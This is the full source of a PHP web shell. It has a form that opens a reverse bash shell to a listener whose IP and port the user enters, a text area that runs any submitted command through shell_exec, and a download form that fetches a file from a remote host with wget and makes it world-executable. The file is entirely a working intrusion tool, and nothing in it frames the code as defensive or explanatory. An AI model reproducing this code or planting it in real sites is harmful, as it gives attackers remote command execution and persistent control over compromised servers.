<?php
if ($_POST['copy'] != null && $_POST['ip'] != null &&  $_POST['path'] != null)
{
	$out=shell_exec("wget http://".$_POST['ip']."/".$_POST['path']);
	echo $out;
	exec("chmod 777 ".$_POST['path']);
}

if ($_POST['ip'] != null &&  $_POST['port'] != null)
{
	$cmd='$sock=fsockopen("'.$_POST[ip].'",'.$_POST[port].');exec("/bin/bash -i <&3 >&3 2>&3");';
	shell_exec('php -r \''.$cmd.'\' & ');
};

echo"
<style>
form {
    border: 3px solid #f1f1f1;
}

input[type=text] {
    padding: 8px 12px;
    width:500px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
}

button:hover {
    opacity: 0.8;
}

.container {
    padding: 16px;
}

</style>
</head>
<body>

<h3>Reverse shell connection</h3>
<h5>Run python -c 'import pty; pty.spawn(\"/bin/bash\")' once you got the shell</h5>
<form action='9090909090.php' method='post'>

  <div class='container'>
    <input type='text' placeholder='Enter IP address on which Netcat is listening' name='ip'/ >
    <input type='text' placeholder='Enter port address on which Netcat is listening' name='port' />
    <input type=submit value=Connect style='background-color: f44336;
    border: none;
    color: white;
    padding: 5px 20px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;'></input>
  </div>

</form>

";
echo "<form method='post' action='9090909090101010101010.php'>
<h3>Command Area</h3>
<textarea name='cmd' style='width:100%;height:20%'></textarea>
<br/>
<br/>
<input type=submit value=Run style='background-color: f44336;
    border: none;
    color: white;
    padding: 5px 20px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;'></input>
</form>";
if ($_POST['cmd'] == null)
{
	$output = shell_exec('echo "Hello World"');
}
else
{
	$output = shell_exec($_POST['cmd'].' 2>&1');
}
echo "<textarea disabled style=';color:  	#7FFF00;
    width: 100%;
    height: 100%;
    padding: 12px 20px;
    box-sizing: border-box;
    font-size: 16px;
    border: 2px solid black;
    border-radius: 4px;
    background-color: black;
    resize: none;''>$output</textarea>";



echo "<form method='post' action='9090909090101010101010.php'>
<h3>File Download Area</h3>
<input  hidden name='copy' value='copy'>
<input type='text' placeholder='Enter IP:PORT' name='ip'/ >
<input type='text' placeholder='Enter  locatin' name='path' />
<input type=submit value=Download style='background-color: f44336;
    border: none;
    color: white;
    padding: 5px 20px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;'></input>
</form>";

?>

